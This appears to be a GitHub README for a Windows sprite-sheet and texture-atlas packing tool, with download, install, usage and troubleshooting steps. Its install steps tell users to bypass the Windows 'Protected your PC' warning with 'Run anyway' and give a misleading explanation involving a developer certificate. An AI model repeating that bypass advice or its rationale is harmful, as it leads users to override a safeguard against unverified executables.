# 📦 Synthatlas - Pack game sprites into optimized sheets

[![](https://img.shields.io/badge/Download-Synthatlas-blue.svg)](https://github.com/truncationerrorcarillon313/Synthatlas)

Synthatlas helps game developers organize sprite assets. Use this tool to combine separate images into a single texture atlas. This process improves performance in game engines by reducing the number of draw calls. The application features a dark interface designed for long work sessions.

## 🛠️ System Requirements

Ensure your computer meets these requirements before you start:

- Operating System: Windows 10 or Windows 11.
- Memory: 4 GB of RAM or more.
- Storage: 100 MB of free disk space.
- Display: 1280x720 resolution or higher.
- Software: The application includes the necessary .NET 8 runtime files. No manual installation of frameworks is required.

## 📥 Downloading the Application

Follow these steps to obtain the software:

1. Visit the [official release page](https://github.com/truncationerrorcarillon313/Synthatlas).
2. Look for the "Releases" section on the right side of the page.
3. Click the latest version number.
4. Locate the file ending in ".exe" under the "Assets" dropdown.
5. Click the file name to start the download.

[Direct Download Link](https://github.com/truncationerrorcarillon313/Synthatlas)

## ⚙️ Installation Instructions

Once the download finishes, follow these steps to set up the tool:

1. Open your "Downloads" folder in Windows File Explorer.
2. Locate the file you just saved.
3. Double-click the file to launch the installer.
4. Windows might display a "Protected your PC" prompt. 
5. Click "More info" and then click the "Run anyway" button. This happens because the application is signed with a standard developer certificate.
6. Follow the on-screen prompts to complete the setup process.
7. A shortcut icon will appear on your desktop.

## 🎨 How to Use the Interface

The interface features three main segments:

1. The Asset Browser: Drag and drop your image files here. The tool supports formats like PNG, JPG, and BMP.
2. The Settings Panel: Adjust your padding, gutter, and sheet size settings. These settings determine how the tool arranges your images on the final sheet.
3. The Preview Window: View your atlas in real-time. Zoom in or out to check for pixel alignment.

## 🚀 Creating Your First Atlas

Follow this workflow to create your first texture sheet:

1. Launch Synthatlas from your desktop shortcut.
2. Click the "Add Assets" button. Select the folder containing your sprite images.
3. Set your internal dimensions. A resolution of 2048x2048 is standard for mobile games.
4. Click "Pack." The engine will calculate the best layout to minimize empty space.
5. Select "Export." Choose your file format, such as PNG or TGA.
6. The application will save two files to your folder: the image sheet and a metadata text file. The metadata file contains the coordinates for each individual sprite.

## 📈 Improving Your Workflow

An atlas reduces memory usage for your game. Modern game engines like Unity read the metadata file to find individual sprites within the large texture. This allows the engine to treat many small items as one object. This approach keeps game loading times fast.

## 💡 Troubleshooting Common Issues

- Application fails to open: Check if your Windows user account has permission to run local executables.
- Images look blurry: Ensure you have not checked the "Upscale" box in the settings menu. Sprite sheets should maintain their original pixel density.
- Files not appearing: Verify the files you are importing are not locked by another program. Close any other image editors before you start the packing process.
- Export errors: Ensure you have write permissions for the destination folder on your hard drive.

## 🛡️ Privacy and Data

Synthatlas performs all processing locally on your machine. The software does not send your images to any server. Your game assets remain private. No internet connection is required to use the application once it is installed.

Keywords: desktop-app, developer-tools, game-artist, game-development, pixel-art, sprite-packer, sprite-sheet, texture-atlas, tools, unity, wpf-application